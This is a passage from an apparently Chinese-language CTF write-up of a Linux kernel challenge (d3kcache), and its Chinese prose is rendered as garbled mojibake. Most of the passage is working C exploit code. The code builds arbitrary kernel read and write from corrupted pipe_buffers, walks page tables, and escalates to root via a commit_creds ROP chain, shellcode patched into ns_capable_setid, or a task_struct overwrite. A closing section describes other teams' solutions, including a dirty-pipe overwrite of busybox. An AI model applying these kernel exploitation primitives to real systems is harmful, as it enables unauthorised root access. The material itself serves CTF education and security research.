class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>),<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    get_root_shell();<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_OFFSET 12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_OFFSET 21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_OFFSET 30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_OFFSET 39</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span><br><br><span class="hljs-type">size_t</span> pgd_addr, mm_struct_addr, *mm_struct_buf;<br><span class="hljs-type">size_t</span> stack_addr, stack_addr_another;<br><span class="hljs-type">size_t</span> stack_page, mm_struct_page;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br><br>    <span class="hljs-keyword">return</span> pte_val;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve_for_3_level</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    <span class="hljs-keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vaddr_remapping</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr, <span class="hljs-type">size_t</span> paddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    buf[PTE_ENTRY(vaddr)] = paddr | <span class="hljs-number">0x8000000000000867</span>; <span class="hljs-comment">/* mark it writable */</span><br>    arbitrary_write_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,<br>                            <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pgd_vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading current task_struct...&quot;</span>);<br><br>    <span class="hljs-comment">/* read current task_struct */</span><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    stack_addr = tsk_buf[<span class="hljs-number">4</span>];<br>    mm_struct_addr = tsk_buf[<span class="hljs-number">292</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);<br><br>    mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);<br><br>    <span class="hljs-comment">/* read mm_struct */</span><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) mm_struct_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (mm_struct_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    mm_struct_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (mm_struct_addr &amp; <span class="hljs-number">0xfff</span>));<br><br>    <span class="hljs-comment">/* only this is a virtual addr, others in page table are all physical addr*/</span><br>    pgd_addr = mm_struct_buf[<span class="hljs-number">9</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * It may also be okay to write ROP chain on pipe_write&#x27;s stack, if there&#x27;s</span><br><span class="hljs-comment"> * no CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT(it can also be bypass by RETs). </span><br><span class="hljs-comment"> * But what I want is a more novel and general exploitation that </span><br><span class="hljs-comment"> * doesn&#x27;t need any information about the kernel image. </span><br><span class="hljs-comment"> * So just simply overwrite the task_struct is good :)</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If you still want a normal ROP, refer to following codes.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff83079ee8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff810157aa</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_rop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>], idx = <span class="hljs-number">0</span>; <br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br>    <br>    <span class="hljs-comment">/* reading the page table directly to get physical addr of kernel stack*/</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading page table...&quot;</span>);<br><br>    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);<br>    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="hljs-comment">/* N/X bit */</span><br>    stack_addr_another += page_offset_base;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);<br><br>    <span class="hljs-comment">/* construct the ROP */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x100</span>) / <span class="hljs-number">8</span>); i++) &#123;<br>        rop[idx++] = RET + kernel_offset;<br>    &#125;<br><br>    rop[idx++] = POP_RDI_RET + kernel_offset;<br>    rop[idx++] = INIT_CRED + kernel_offset;<br>    rop[idx++] = COMMIT_CREDS + kernel_offset;<br>    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="hljs-number">54</span> + kernel_offset;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) get_root_shell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br><br>    stack_page = direct_map_addr_to_page_addr(stack_addr_another);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (stack_page + <span class="hljs-number">0x40</span> * <span class="hljs-number">3</span>), rop, <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_usma</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span><br><br>    <span class="hljs-type">char</span> *kcode_map, *kcode_func;<br>    <span class="hljs-type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br><br>    kcode_map = mmap((<span class="hljs-type">void</span>*) <span class="hljs-number">0x114514000</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, <br>                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!kcode_map) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create mmap area!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* because of lazy allocation, we need to write it manually */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        kcode_map[i] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>        kcode_map[i + <span class="hljs-number">0x1000</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite kernel code seg to exec shellcode directly :) */</span><br>    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,<br>           dst_vaddr);<br><br>    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);<br>    dst_paddr += <span class="hljs-number">0x1000</span> * PTE_ENTRY(dst_vaddr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);<br><br>    <span class="hljs-comment">/* remapping to our mmap area */</span><br>    vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span>, dst_paddr);<br>    vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span> + <span class="hljs-number">0x1000</span>, dst_paddr + <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-comment">/* overwrite kernel code segment directly */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span><br><span class="hljs-comment">     * so we can just patch it to let it always return true :)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>), <span class="hljs-string">&#x27;\x90&#x27;</span>, <span class="hljs-number">0x40</span>); <span class="hljs-comment">/* nop */</span><br>    <span class="hljs-built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>) + <span class="hljs-number">0x40</span>, <br>            <span class="hljs-string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="hljs-comment">/* endbr64 */</span><br>            <span class="hljs-string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="hljs-comment">/* mov rax, 1 */</span><br>            <span class="hljs-string">&quot;\xc3&quot;</span>, <span class="hljs-comment">/* ret */</span><br>            <span class="hljs-number">12</span>);<br><br>    <span class="hljs-comment">/* get root now :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    get_root_shell();<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Just for testing CFI&#x27;s availability :)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger_control_flow_integrity_detection</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pbuf</span> =</span> (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)buf + TRD_PIPE_BUF_SZ);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>, *<span class="hljs-title">ops_addr</span>;</span><br><br>    ops_addr = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) <br>                 (((<span class="hljs-type">size_t</span>) info_pipe_buf.page - vmemmap_base) / <span class="hljs-number">0x40</span> * <span class="hljs-number">0x1000</span>);<br>    ops_addr = (<span class="hljs-keyword">struct</span> pipe_buf_operations*)((<span class="hljs-type">size_t</span>)ops_addr+page_offset_base);<br><br>    <span class="hljs-comment">/* two random gadget :) */</span><br>    ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) buf;<br>    ops-&gt;confirm = (<span class="hljs-type">void</span>*)(<span class="hljs-number">0xffffffff81a78568</span> + kernel_offset);<br>    ops-&gt;release = (<span class="hljs-type">void</span>*)(<span class="hljs-number">0xffffffff816196e6</span> + kernel_offset);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        pbuf-&gt;ops = ops_addr;<br>        pbuf = (<span class="hljs-keyword">struct</span> pipe_buffer *)((<span class="hljs-type">size_t</span>) pbuf + TRD_PIPE_BUF_SZ);<br>    &#125;<br><br>    evil_2nd_buf.page = info_pipe_buf.page;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_4th_buf,<span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_2nd_buf,<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>        <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_3rd_buf,<span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], buf, <span class="hljs-number">0xf00</span>); <br><br>    <span class="hljs-comment">/* trigger CFI... */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[=] triggering CFI&#x27;s detection...\n&quot;</span>);<br>    sleep(<span class="hljs-number">5</span>);<br>    close(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.O - fundamental works</span><br><span class="hljs-comment">     */</span><br><br>    save_status();<br><br>    <span class="hljs-comment">/* bind core to 0 */</span><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* dev file */</span><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/d3kcache!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* spray pgv pages */</span><br>    prepare_pgv_system();<br>    prepare_pgv_pages();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I - page-level heap fengshui to make a cross-cache off-by-null,</span><br><span class="hljs-comment">     * making two pipe_buffer pointing to the same pages</span><br><span class="hljs-comment">     */</span><br>    corrupting_first_level_pipe_for_page_uaf();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II - re-allocate the victim page to pipe_buffer,</span><br><span class="hljs-comment">     * leak page-related address and construct a second-level pipe uaf</span><br><span class="hljs-comment">     */</span><br>    corrupting_second_level_pipe_for_pipe_uaf();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III - re-allocate the second-level victim page to pipe_buffer,</span><br><span class="hljs-comment">     * construct three self-page-pointing pipe_buffer </span><br><span class="hljs-comment">     */</span><br>    building_self_writing_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV - leaking fundamental information by pipe</span><br><span class="hljs-comment">     */</span><br>    info_leaking_by_arbitrary_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.V - different method of exploitation</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rop&quot;</span>)) &#123;<br>        <span class="hljs-comment">/* traditionally root by rop */</span><br>        privilege_escalation_by_rop();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;cfi&quot;</span>)) &#123;<br>        <span class="hljs-comment">/* extra - check for CFI&#x27;s availability */</span><br>        trigger_control_flow_integrity_detection();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;usma&quot;</span>)) &#123;<br>        privilege_escalation_by_usma();<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* default: root by seeking init_task and overwrite current */</span><br>        privilege_escalation_by_task_overwrite();<br>    &#125;<br><br>    <span class="hljs-comment">/* we SHOULDN&#x27;T get there, so panic :( */</span><br>    trigger_control_flow_integrity_detection();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="0x03-è§£é¢˜æƒ…å†µ"><a href="#0x03-è§£é¢˜æƒ…å†µ" class="headerlink" title="0x03.è§£é¢˜æƒ…å†µ"></a>0x03.è§£é¢˜æƒ…å†µ</h1><p>æœ¬æ¬¡æ¯”èµ›å½“ä¸­ä¸€å…±æœ‰ 2 æ”¯é˜Ÿä¼è§£å‡ºäº†ç¬”è€…çš„é¢˜ç›®ï¼Œè¿™ä¸ªæ•°é‡å€’æ˜¯å‡ºä¹ç¬”è€…çš„é¢„æ–™åˆåœ¨é¢„æ–™ä¹‹ä¸­ï¼ˆ<del>æ—¢æ„Ÿè§‰å¥½å¤šåˆæ„Ÿè§‰å¥½å°‘</del>ï¼‰ï¼Œæ¯”è¾ƒå·§çš„æ˜¯ <em>åˆšå¥½ä¸€æ”¯å›½å†…é˜Ÿä¼ä¸ä¸€æ”¯å›½å¤–é˜Ÿä¼</em> ï¼šï¼‰</p><p>NU1L æˆ˜é˜Ÿçš„è§£æ³•æ˜¯åˆ©ç”¨ partial overwrite è¦†å†™ <code>msg_msg-&gt;m_list.next</code> æ„é€  UAFï¼ˆæœ‰ç‚¹åƒ CVE-2021-22555 çš„è§£æ³•ï¼‰ï¼Œåˆ†é… <code>msg_msgseg</code> æ¥æ„é€  <code>fake msg_msg</code> å®ç°è¶Šç•Œè¯»ï¼Œä¹‹ååˆ©ç”¨ <code>fcntl(F_SETPIPE_SZ)</code> æ”¹å° <code>pipe_buffer</code> åè½¬ç§» UAF åˆ° <code>pipe_buffer</code> ä¸Šä»è€Œæ„é€  dirty pipe è¦†å†™ busyboxï¼Œä¸è¿‡æ¯”è¾ƒå‡ºä¹ç¬”è€…é¢„æ–™çš„æ˜¯ä»–ä»¬å¹¶æ²¡æœ‰ç”¨é¡µçº§å †é£æ°´ï¼Œè€Œæ˜¯é€‰æ‹©<strong>ç›´æ¥å †å–·å¤§é‡ msg_msg</strong>ï¼Œè¿™æ ·é¢˜ç›®æ‰€åœ¨çš„ slub é¡µé¢ä¸ <code>msg_msg</code> æ‰€åœ¨ slub é¡µé¢ä¾¿è¿˜æ˜¯æœ‰ä¸€å®šå‡ ç‡æŒ¨åˆ°ä¸€èµ·ï¼ˆç”±äºå¤§å° 0x1000 çš„ <code>msg_msg</code> æ‰€åœ¨ slab <strong>åŒæ ·æ¥è‡ªäº order-3</strong>ï¼Œå› æ­¤å®é™…ä¸Šä»…çº¯å †å–·ä¹Ÿæœ‰ä¸€å®šçš„å‡ ç‡ä½¿å¾—å¯¹åº” slab æŒ¨åœ¨ä¸€èµ·ï¼‰</p><p>TeamGoulash çš„è§£æ³•å‰åŠæ®µä¸å®˜æ–¹è§£æ³•çš„ä¸­æ®µåŸºæœ¬ä¸Šæ˜¯ä¸€è‡´çš„ï¼Œå³åˆ©ç”¨  <code>fcntl(F_SETPIPE_SZ)</code> æ”¹å¤§  <code>pipe_buffer</code> åˆ° order-3 åé€šè¿‡å¯¹ page æŒ‡é’ˆçš„ partial overwrite æ„é€  page-level çš„ UAFï¼Œä¹‹ååœ¨ UAF page ä¸Šåˆ†é…æ–°çš„ <code>pipe_buffer</code> ï¼Œä¸è¿‡ä»–ä»¬å¹¶æ²¡æœ‰åƒç¬”è€…é‚£æ ·ç»§ç»­æ„é€ è‡ªè¯»å†™ç®¡é“æ¥å®Œæˆå†…å­˜ç©ºé—´ä»»æ„è¯»å†™ï¼Œ<strong>è€Œæ˜¯å°† UAF page åˆ†é…ä¸ºæ–°è¿›ç¨‹çš„é¡µè¡¨é¡µé¢</strong>ï¼ˆç”±äº COW æœºåˆ¶ï¼Œ<code>fork()</code> åˆ›å»ºæ–°è¿›ç¨‹çš„è¿‡ç¨‹ä¸­å…¶å®ä»…ä¼šåˆ†é…æ–°çš„é¡µè¡¨é¡¹åŠå…¶ä»–å†…æ ¸ç»“æ„ä½“ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æœ‰ä¸å°çš„æ¦‚ç‡ä½¿ UAF é¡µé¢è¢«å¤ç”¨ä¸ºé¡µè¡¨ä¸­çš„æŸä¸€çº§é¡µé¢ï¼‰ï¼Œä¹‹å<strong>å°† busybox æ˜ å°„åˆ° UAF é¡µè¡¨é¡¹å¯¹åº”çš„å†…å­˜ç©ºé—´ï¼Œä»è€Œå®Œæˆè¶Šæƒå†™å…¥</strong>ï¼Œç”±äºç¼ºä¹æœ‰æ•ˆçš„å †é£æ°´æ‰‹æ®µä»¥åŠé¡µåˆ†é…çš„ä¸ç¨³å®šæ€§å¯¼è‡´<strong>æˆåŠŸç‡è¾ƒä½</strong>ï¼ˆæ¯•ç«Ÿåˆ†é…è¿‡ç¨‹å½“ä¸­è¿˜æ˜¯æœ‰éå¸¸å¤šçš„å™ªéŸ³ï¼Œæ®è¯¥æˆ˜é˜Ÿè‡ªè¿°æˆåŠŸç‡åªæœ‰ 5%ï¼‰</p><blockquote><p>ä»¥åŠ TeamGoulash 